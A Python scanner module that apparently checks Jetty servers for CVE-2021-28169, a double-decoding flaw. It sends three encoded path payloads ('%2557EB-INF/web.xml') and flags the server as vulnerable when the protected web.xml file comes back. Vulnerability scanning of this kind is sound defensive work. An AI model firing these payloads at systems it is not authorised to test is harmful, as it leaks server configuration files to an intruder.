#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2021_28169_payloads = [
    {'path': 'static?/%2557EB-INF/web.xml'},
    {'path': 'concat?/%2557EB-INF/web.xml'},
    {'path': '?/%2557EB-INF/web.xml'},
]

def cve_2021_28169_scan(clients):
    ''' 在版本9.4.40、10.0.2、11.0.2 之前, ConcatServlet和WelcomeFilterJetty Servlet中的类受到"双重解码"错误的影响 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Jetty',
        'vul_type': 'DSinfo',
        'vul_id': 'CVE-2021-28169',
    }

    for payload in cve_2021_28169_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('<web-app>' in res.text)
            and ('<display-name>' in res.text)
            and ('<!DOCTYPE web-app PUBLIC' in res.text)
            and ('Sun Microsystems' in res.text)
            and ('DTD Web Application' in res.text)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
